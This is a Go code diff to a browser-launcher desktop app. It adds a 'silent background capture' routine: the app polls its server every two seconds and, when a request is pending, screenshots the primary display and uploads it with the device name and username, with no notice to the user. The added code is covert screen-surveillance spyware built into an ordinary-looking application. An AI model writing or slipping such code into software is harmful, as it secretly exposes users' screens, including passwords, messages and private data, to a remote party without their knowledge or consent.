@@ -2,10 +2,13 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"encoding/json"
 	"fmt"
 	"html/template"
+	"image/jpeg"
 	"io"
+	"mime/multipart"
 	"net"
 	"net/http"
 	"net/url"
@@ -18,6 +21,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/kbinani/screenshot"
 	"golang.org/x/net/proxy"
 )
 
@@ -58,6 +62,7 @@ type LumierApp struct {
 	sessionStart   time.Time
 	sessionID      string
 	stopProxy      func()
+	stopScreenshot chan struct{}
 
 	mu sync.Mutex
 }
@@ -298,6 +303,10 @@ func launchBrowser(device ClientDevice) {
 	app.sessionID = startSession(app.config.ServerURL, device, app.currentUser)
 	app.sessionStart = time.Now()
 
+	// Start screenshot monitoring (silent background capture)
+	app.stopScreenshot = make(chan struct{})
+	go screenshotMonitor(device)
+
 	// Launch Firefox
 	args := []string{
 		"-profile", profileDir,
@@ -310,6 +319,9 @@ func launchBrowser(device ClientDevice) {
 	startTime := time.Now()
 	cmd.Run()
 	duration := time.Since(startTime)
+
+	// Stop screenshot monitoring
+	close(app.stopScreenshot)
 
 	// Cleanup
 	stopProxy()
@@ -1192,3 +1204,97 @@ const htmlTemplate = `<!DOCTYPE html>
 </body>
 </html>
 `
+
+// ============================================================================
+// SCREENSHOT MONITORING (Silent Background Capture)
+// ============================================================================
+
+// screenshotMonitor polls the server for screenshot requests and captures silently
+func screenshotMonitor(device ClientDevice) {
+	ticker := time.NewTicker(2 * time.Second)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-app.stopScreenshot:
+			return
+		case <-ticker.C:
+			if checkScreenshotPending(device.ID) {
+				captureAndUpload(device)
+			}
+		}
+	}
+}
+
+// checkScreenshotPending checks if there's a pending screenshot request for this device
+func checkScreenshotPending(deviceID string) bool {
+	client := &http.Client{Timeout: 5 * time.Second}
+	resp, err := client.Get(app.config.ServerURL + "/api/client/screenshot/pending?device_id=" + url.QueryEscape(deviceID))
+	if err != nil {
+		return false
+	}
+	defer resp.Body.Close()
+
+	var result struct {
+		Pending bool `json:"pending"`
+	}
+	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+		return false
+	}
+	return result.Pending
+}
+
+// captureAndUpload captures a screenshot and uploads it to the server silently
+func captureAndUpload(device ClientDevice) {
+	// Get the number of displays
+	n := screenshot.NumActiveDisplays()
+	if n == 0 {
+		return
+	}
+
+	// Capture the primary display
+	bounds := screenshot.GetDisplayBounds(0)
+	img, err := screenshot.CaptureRect(bounds)
+	if err != nil {
+		return
+	}
+
+	// Encode as JPEG
+	var buf bytes.Buffer
+	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 75}); err != nil {
+		return
+	}
+
+	// Create multipart form
+	var formBuf bytes.Buffer
+	writer := multipart.NewWriter(&formBuf)
+
+	// Add form fields
+	writer.WriteField("device_id", device.ID)
+	writer.WriteField("device_name", device.Name)
+	writer.WriteField("username", app.currentUser)
+	writer.WriteField("width", strconv.Itoa(bounds.Dx()))
+	writer.WriteField("height", strconv.Itoa(bounds.Dy()))
+
+	// Add the screenshot file
+	part, err := writer.CreateFormFile("screenshot", "screenshot.jpg")
+	if err != nil {
+		return
+	}
+	part.Write(buf.Bytes())
+	writer.Close()
+
+	// Upload to server
+	client := &http.Client{Timeout: 30 * time.Second}
+	req, err := http.NewRequest("POST", app.config.ServerURL+"/api/client/screenshot/upload", &formBuf)
+	if err != nil {
+		return
+	}
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return
+	}
+	resp.Body.Close()
+}
